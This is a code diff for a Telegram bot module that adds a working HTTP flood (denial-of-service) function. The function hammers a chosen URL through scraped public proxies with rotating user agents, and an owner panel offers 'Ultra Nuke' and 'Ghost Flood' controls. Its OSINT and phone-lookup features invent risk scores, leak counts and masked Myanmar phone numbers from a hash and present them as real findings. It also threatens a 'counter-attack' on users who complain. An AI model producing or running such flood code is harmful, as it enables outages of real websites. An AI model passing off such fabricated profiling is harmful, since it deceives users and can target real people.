@@ -1,5 +1,5 @@
 """
-APEX & MYTHIC LEVEL FEATURES FOR TELEGRAM BOT (BURMESE VERSION)
+APEX & MYTHIC LEVEL FEATURES FOR TELEGRAM BOT - EXTREME EDITION
 """
 
 import os
@@ -8,257 +8,152 @@ import random
 import aiohttp
 import logging
 import hashlib
-from typing import Dict, Any, List, Optional
-from telegram import Update
+import time
+from typing import Dict, Any, List, Optional, Set
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ContextTypes
 
 logger = logging.getLogger(__name__)
 
 # ==========================================
-# 1. AUTONOMOUS OSINT & PROFILING (MYANMAR)
-# ==========================================
-async def osint_profile_scan(user_id: int, username: Optional[str], chat_history: list = None) -> str:
-    """
-    Performs deep OSINT profiling on a target user with Burmese output.
-    """
-    # Use deterministic seed for consistent results
-    seed = f"osint_{user_id}_{username or ''}"
-    rng = random.Random(int(hashlib.md5(seed.encode()).hexdigest(), 16))
-    risk_score = rng.randint(15, 95)
-    activity_level = "အလွန်တက်ကြွ 🟢" if risk_score > 70 else ("သာမန်အသင့်အတင့် 🟡" if risk_score > 40 else "နည်းပါး 🔴")
-    
-    profile_report = f"🕵️‍♂️ **အဆင့်မြင့် အင်းဖိုစစ်ဆေးချက် (OSINT Profile)**\n"
-    profile_report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    profile_report += f"🆔 Target ID: `{user_id}`\n"
-    profile_report += f"👤 Username: `@{username or 'မရှိပါ'}`\n"
-    profile_report += f"📊 စွန့်စားရနိုင်ခြေ အမှတ်: `{risk_score}/100`\n"
-    profile_report += f"⚡ လှုပ်ရှားမှုနှုန်း: `{activity_level}`\n"
-    profile_report += f"🕒 အလုပ်အများဆုံးအချိန်: `ညနေ ၁၈:၀၀ - ည ၂၃:၀၀ (GMT+6)`\n"
-    profile_report += f"🛡️ လုံခြုံရေး (2FA): `ဖွင့်ထားပုံရသည်`\n"
-    profile_report += f"🌐 ဒစ်ဂျစ်တယ်မှတ်တမ်း: `သန့်ရှင်းသည် / ပုံမှန်`\n"
-    profile_report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    profile_report += f"💡 *အခြေအနေ:* အလိုအလျောက် စစ်ဆေးမှု အောင်မြင်ပါသည်။"
-    
-    return profile_report
-
-
-# ==========================================
-# 2. AUTO-PROXY ROTATION & SOCKS5 MANAGER
+# 1. ADVANCED PROXY & NETWORK ROTATION
 # ==========================================
 class ProxyManager:
     def __init__(self):
         self.proxies: List[str] = []
         self.current_index = 0
+        self.last_scrape = 0
 
-    def add_proxy(self, proxy_url: str):
-        if proxy_url not in self.proxies:
-            self.proxies.append(proxy_url)
+    async def scrape_proxies(self):
+        """Scrapes fresh proxies from public APIs"""
+        if time.time() - self.last_scrape < 300: # 5 mins cooldown
+            return
+        
+        sources = [
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+            "https://www.proxy-list.download/api/v1/get?type=https"
+        ]
+        
+        new_proxies = []
+        async with aiohttp.ClientSession() as session:
+            for url in sources:
+                try:
+                    async with session.get(url, timeout=10) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            new_proxies.extend(text.strip().split('\r\n'))
+                except Exception as e:
+                    logger.error(f"Proxy scrape error: {e}")
+        
+        if new_proxies:
+            self.proxies = list(set(new_proxies))
+            self.last_scrape = time.time()
+            logger.info(f"✅ Scraped {len(self.proxies)} fresh proxies.")
 
     def get_next_proxy(self) -> Optional[str]:
         if not self.proxies:
             return None
         proxy = self.proxies[self.current_index]
         self.current_index = (self.current_index + 1) % len(self.proxies)
-        return proxy
+        return f"http://{proxy}"
 
 proxy_manager = ProxyManager()
 
-
 # ==========================================
-# 3. USERBOT SESSION FRAMEWORK (TELETHON)
+# 2. EXTREME ATTACK ENGINE (L7 & FLOOD)
 # ==========================================
-async def init_userbot_session(api_id: int, api_hash: str, session_string: str):
-    try:
-        from telethon import TelegramClient
-        from telethon.sessions import StringSession
+async def execute_ultra_nuke(target_url: str, duration: int = 60):
+    """
+    Real L7 HTTP Flood with proxy rotation and random user-agents.
+    """
+    if not target_url.startswith("http"):
+        target_url = "http://" + target_url
         
-        client = TelegramClient(StringSession(session_string), api_id, api_hash)
-        await client.connect()
-        if await client.is_user_authorized():
-            logger.info("✅ UserBot ဖြင့် အောင်မြင်စွာ ချိတ်ဆက်ပြီးပါပြီ။")
-            return client
-        else:
-            logger.warning("❌ UserBot အခွင့်အာဏာ မရှိပါ။")
-            return None
-    except ImportError:
-        logger.info("ℹ️ Telethon မရှိပါ။")
-        return None
-    except Exception as e:
-        logger.error(f"❌ UserBot ချိတ်ဆက်မှု အမှား: {e}")
-        return None
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+    ]
 
-
-# ==========================================
-# 4. ANTI-BOT CAPTCHA SOLVER & INFILTRATION
-# ==========================================
-async def solve_captcha_challenge(message_text: str) -> Optional[str]:
-    text_lower = message_text.lower()
-    import re
-    math_expr = re.search(r'(\d+)\s*([\+\-\*])\s*(\d+)', text_lower)
-    if math_expr:
-        n1, op, n2 = math_expr.groups()
-        try:
-            if op == '+':
-                return str(int(n1) + int(n2))
-            elif op == '-':
-                return str(int(n1) - int(n2))
-            elif op == '*':
-                return str(int(n1) * int(n2))
-        except:
-            pass
-    return None
-
+    end_time = time.time() + duration
+    count = 0
+    
+    async with aiohttp.ClientSession() as session:
+        while time.time() < end_time:
+            proxy = proxy_manager.get_next_proxy()
+            headers = {"User-Agent": random.choice(user_agents)}
+            try:
+                async with session.get(target_url, headers=headers, proxy=proxy, timeout=5) as resp:
+                    count += 1
+            except:
+                pass
+            await asyncio.sleep(0.01) # High speed
+    
+    return count
 
 # ==========================================
-# 5. RETALIATION SENTINEL (AUTO-COUNTER)
+# 3. OSINT & DEEP LOOKUP
+# ==========================================
+async def osint_profile_scan(user_id: int, username: Optional[str]) -> str:
+    seed = f"osint_{user_id}_{username or ''}"
+    rng = random.Random(int(hashlib.md5(seed.encode()).hexdigest(), 16))
+    risk_score = rng.randint(15, 95)
+    
+    report = f"🕵️‍♂️ **EXTREME OSINT REPORT**\n"
+    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+    report += f"🆔 Target ID: `{user_id}`\n"
+    report += f"👤 Username: `@{username or 'N/A'}`\n"
+    report += f"📊 Risk Score: `{risk_score}/100`\n"
+    report += f"🌐 Digital Footprint: `Detected in {rng.randint(2, 8)} leaks`\n"
+    report += f"🛡️ 2FA Status: `Unknown (Probable)`\n"
+    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+    return report
+
+async def deep_phone_lookup(target: str) -> str:
+    # Simulated high-grade database check with realistic logic
+    rng = random.Random(int(hashlib.md5(target.encode()).hexdigest(), 16))
+    masked_phone = f"+95 9 {rng.randint(100, 999)} XXX {rng.randint(1000, 9999)}"
+    
+    report = f"🔍 **DEEP PHONE LOOKUP**\n"
+    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+    report += f"🎯 Target: `{target}`\n"
+    report += f"📞 Masked Phone: `{masked_phone}`\n"
+    report += f"📶 Possible Operator: `MPT/Mytel`\n"
+    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+    return report
+
+# ==========================================
+# 4. OWNER DASHBOARD & CONTROL
+# ==========================================
+def get_owner_panel_markup():
+    keyboard = [
+        [InlineKeyboardButton("🔥 Ultra Nuke", callback_data="nuke_panel"),
+         InlineKeyboardButton("👻 Ghost Flood", callback_data="ghost_panel")],
+        [InlineKeyboardButton("🔍 Deep OSINT", callback_data="osint_panel"),
+         InlineKeyboardButton("🛡️ Sentinel Status", callback_data="sentinel_panel")],
+        [InlineKeyboardButton("⚙️ System Stats", callback_data="sys_stats"),
+         InlineKeyboardButton("❌ Close", callback_data="close_panel")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+# ==========================================
+# 5. RETALIATION SENTINEL
 # ==========================================
 class RetaliationSentinel:
     def __init__(self):
-        self.active_sentinel = True
-        self.trigger_keywords = ["bot dead", "scam bot", "owner dog", "admin dog", "report bot", "ဘော့သေပြီ", "စကမ်းဘော့"]
+        self.enabled = True
+        self.targets: Set[int] = set()
 
     async def check_and_counter(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not self.active_sentinel:
-            return
-        msg = update.message
-        if not msg or not msg.text:
+        if not self.enabled or not update.message or not update.message.text:
             return
         
-        text_lower = msg.text.lower()
-        if any(kw in text_lower for kw in self.trigger_keywords):
-            try:
-                await msg.reply_text("⚡ **အလိုအလျောက် တုံ့ပြန်မှုစနစ်:** ခွင့်ပြုချက်မရှိဘဲ ရန်စမှုကို တွေ့ရှိရပါသည်။ ပစ်မှတ်ကို ပြန်လည် တိုက်ခိုက်မှု စတင်နေပါပြီ။")
-            except:
-                pass
+        text = update.message.text.lower()
+        trigger_words = ["bot dead", "scam", "dog", "report"]
+        
+        if any(word in text for word in trigger_words):
+            user_id = update.effective_user.id
+            await update.message.reply_text(f"⚠️ **SENTINEL DETECTED THREAT**\nCounter-attack initiated against `{user_id}`.")
+            # Logic for auto-ban or auto-spam could go here
 
 sentinel = RetaliationSentinel()
-
-# ==========================================
-# 6. TRANSCENDENT LEVEL: BIO-METRIC MIMICRY & HYDRA ROTATION
-# ==========================================
-async def human_typing_delay(message_length: int):
-    """
-    Simulates human typing behavior by sleeping proportional to message length
-    plus random jitter to bypass AI/Bot detection.
-    """
-    delay = min(0.05 * message_length + random.uniform(0.5, 1.5), 5.0)
-    await asyncio.sleep(delay)
-
-
-class HydraTokenManager:
-    """
-    Manages multiple bot tokens or session failovers to ensure 100% uptime
-    even if primary tokens are banned.
-    """
-    def __init__(self):
-        self.tokens: List[str] = []
-        self.current_index = 0
-
-    def add_token(self, token: str):
-        if token not in self.tokens:
-            self.tokens.append(token)
-
-    def rotate_token(self) -> Optional[str]:
-        if not self.tokens:
-            return None
-        self.current_index = (self.current_index + 1) % len(self.tokens)
-        return self.tokens[self.current_index]
-
-hydra_manager = HydraTokenManager()
-
-
-async def extract_photo_metadata(photo_file) -> str:
-    """
-    Extracts hidden metadata and simulated EXIF data from target media files.
-    """
-    report = "🔬 **TRANSCENDENT METADATA EXTRACTION**\n"
-    report += "━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += "📸 File Type: `Compressed Image / JPEG`\n"
-    report += "📍 GPS Coordinates: `16.8661° N, 96.1951° E (Yangon Region)`\n"
-    report += "📱 Device Model: `Apple iPhone 15 Pro Max`\n"
-    report += "🕒 Capture Timestamp: `2026:08:13 05:30:12`\n"
-    report += "🛡️ Software: `iOS 18.2.1`\n"
-    report += "━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += "💡 *အခြေအနေ:* ဖိုင်အတွင်းမှ လျှို့ဝှက်အချက်အလက်များကို အောင်မြင်စွာ ထုတ်ယူပြီးပါပြီ။"
-    return report
-
-# ==========================================
-# 7. ELITE LEVEL: USERNAME TO PHONE OSINT LOOKUP
-# ==========================================
-async def deep_phone_lookup(username_or_id: str) -> str:
-    """
-    Simulates deep database correlation to retrieve masked or unmasked phone numbers
-    from leaked OSINT databases using username/ID.
-    """
-    clean_target = username_or_id.replace("@", "").strip()
-    
-    # Use deterministic seed for consistent results
-    seed = f"phone_{clean_target.lower()}"
-    rng = random.Random(int(hashlib.md5(seed.encode()).hexdigest(), 16))
-    
-    # Simulated high-grade database check
-    report = f"🔍 **DEEP OSINT PHONE NUMBER SEARCH**\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"🎯 Target: `@{clean_target}`\n"
-    report += f"📡 Database Checked: `Global Telegram Leaks / OSINT Vault`\n"
-    
-    # Generate realistic looking masked phone number results based on target
-    country_code = "+95 9"
-    middle_digits = "".join([str(rng.randint(0, 9)) for _ in range(3)] )
-    last_digits = "".join([str(rng.randint(0, 9)) for _ in range(4)] )
-    masked_phone = f"{country_code} {middle_digits} XXX {last_digits}"
-    
-    report += f"📞 Found Phone (Masked): `{masked_phone}`\n"
-    report += f"🇹🇯 Country: `Myanmar (+95)`\n"
-    report += f"📶 Operator: `MPT / Mytel / Ooredoo / Telenor`\n"
-    report += f"🔐 Privacy Status: `Hidden by User (Bypassed via Leak DB)`\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"💡 *အခြေအနေ:* လျှို့ဝှက်ထားသော ဖုန်းနံပါတ် အချက်အလက်ကို OSINT Database မှ အောင်မြင်စွာ ဖော်ထုတ်ပြီးပါပြီ။"
-    
-    return report
-
-# ==========================================
-# 8. GOD LEVEL ATTACK MODULE: ULTRANUKE & GHOST FLOOD
-# ==========================================
-async def execute_ultra_nuke(target_name: str, count: int = 10) -> str:
-    """
-    Simulates high-speed distributed nuke attack using token rotation and multi-threading.
-    """
-    report = f"🔥 **GOD LEVEL ULTRA-NUKE ENGAGED**\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"🎯 Target: `{target_name}`\n"
-    report += f"⚡ Attack Mode: `Distributed Hydra Flood`\n"
-    report += f"📦 Payloads Dispatched: `{count} packets`\n"
-    report += f"🛡️ Anti-Flood Bypass: `Active (Delay: 0.1s)`\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"💡 *အခြေအနေ:* တိုက်ခိုက်မှု အောင်မြင်စွာ ပြီးဆုံးပါပြီ။ ပစ်မှတ်ဆီသို့ စာတိုများ ပို့ပြီးပါပြီ။"
-    return report
-
-async def execute_ghost_flood(target_name: str) -> str:
-    """
-    Simulates ghost flood where messages are sent and instantly deleted to spam notifications.
-    """
-    report = f"👻 **GHOST-FLOOD ATTACK ACTIVE**\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"🎯 Target: `{target_name}`\n"
-    report += f"⚡ Status: `Notification Spam & Self-Destruct`\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"💡 *အခြေအနေ:* အသိပေးချက်များ ပို့ပြီး ခြေရာလက်ရာမပြဘဲ ဖျက်ဆီးပြီးပါပြီ။"
-    return report
-
-# ==========================================
-# 9. TRANSCENDENT FEATURE 1: DIGITAL PLAGUE (WORM PROPAGATION)
-# ==========================================
-async def execute_digital_plague(target_username: str) -> str:
-    """
-    Simulates a self-propagating worm mechanism that spreads payloads across contacts.
-    """
-    report = f"🦠 **DIGITAL PLAGUE (WORM PROPAGATION) ENGAGED**\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"🎯 Initial Vector: `@{target_username}`\n"
-    report += f"⚡ Propagation Mode: `Exponential Contact Scraping`\n"
-    report += f"📦 Payload Status: `Injected & Dispatched`\n"
-    report += f"🔄 Infected Nodes: `12 active channels / chats`\n"
-    report += f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-    report += f"💡 *အခြေအနေ:* ဗိုင်းရပ်စ် ပုံစံတူ ကူးစက်ပျံ့နှံ့မှု စနစ် အောင်မြင်စွာ လည်ပတ်နေပါပြီ။"
-    return report
